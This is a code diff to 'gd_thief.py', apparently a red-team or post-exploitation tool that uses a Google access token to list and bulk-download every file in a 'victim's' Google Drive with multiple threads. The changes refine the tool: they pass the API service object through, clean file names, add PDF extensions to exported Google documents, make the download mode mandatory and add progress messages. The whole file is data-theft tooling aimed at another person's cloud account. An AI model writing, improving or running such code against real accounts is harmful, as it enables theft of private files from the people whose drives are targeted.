@@ -43,12 +43,10 @@ def build_service():
     return service
 
 ### Creates a list of all of the downloadable and exportable files in the victim's G-Drive
-def list_files():
+def list_files(service):
     ### DEBUG:
     #f = open("./tmp/file_list.txt", "w")
 
-    service = build_service()
-    #f = open("./tmp/file_list.txt", "w")
     filelist = []
     # Call the Drive v3 API
     page_token = None
@@ -92,10 +90,12 @@ def download_and_export(file_list):
     service = build_service()
     file_name, file_Id, mime = file_list.strip().split('|')
     file_name = file_name.replace(" ", "")
+    file_name = file_name.replace(":", "")
     google_mime ='application/vnd.google-apps.'
     if google_mime in mime:
         request = service.files().export_media(fileId=file_Id,
           mimeType='application/pdf')
+        file_name += ".pdf"
     else:
         request = service.files().get_media(fileId=file_Id)
 
@@ -125,7 +125,7 @@ def main():
     mode = ""
     thread = 1
     # usage
-    usage = '\nusage: gd_thief.py [-h] -m [{dlAll,} (default = dlAll)\n'
+    usage = '\nusage: gd_thief.py [-h] -m [{dlAll,}\n'
     usage += '\t[-t <THREAD COUNT>]'
     #help
     help = '\nThis Module will connect to Google\'s API using an access token and '
@@ -134,10 +134,10 @@ def main():
     help += '\n\t-m [{dlAll}],'
     help += '\n\t\t--mode [{dlAll}]'
     help += '\n\t\tThe mode of file download'
-    help += '\n\t\tCan be \"dlAll\", or... (default: dlAll)'
+    help += '\n\t\tCan be \"dlAll\", or... (More options to come)'
     help += '\n\noptional arguments:'
     help += '\n\t-t <THREAD COUNT>, --threads <THREAD COUNT>'
-    help += '\n\t\t\tNumber of threads. (Too many could exceeed Google\'s rate limit threshold).'
+    help += '\n\t\t\tNumber of threads. (Too many could exceeed Google\'s rate limit threshold)'
     help += '\n\n\t-h, --help\n\t\tshow this help message and exit\n'
     # try parsing options and arguments
     try :
@@ -156,12 +156,15 @@ def main():
             thread = arg
     # check for mandatory narguments
     if not mode:
-        mode ='dlAll'
+        print("\nMode  (-m, --mode) is a mandatory argument\n")
+        print(usage)
+        sys.exit(2)
+        
     # Build the GDrive Service
-
+    service = build_service()
     if mode == 'dlAll':
-        print('[*] Scanning target G-Drive...')
-        filelist = list_files()
+        print('[*] Scanning target G-Drive.  This could take a while...')
+        filelist = list_files(service)
         q = Queue()
 
         print('[*] Downloading Files...')
@@ -172,6 +175,8 @@ def main():
         for file in filelist:
             q.put(file)
         q.join()
+        print('[*] Drive donload complete.')
+        
     else:
         print('\nInvalid arument (-m, --mode): %s\n' % mode)
         print(usage)
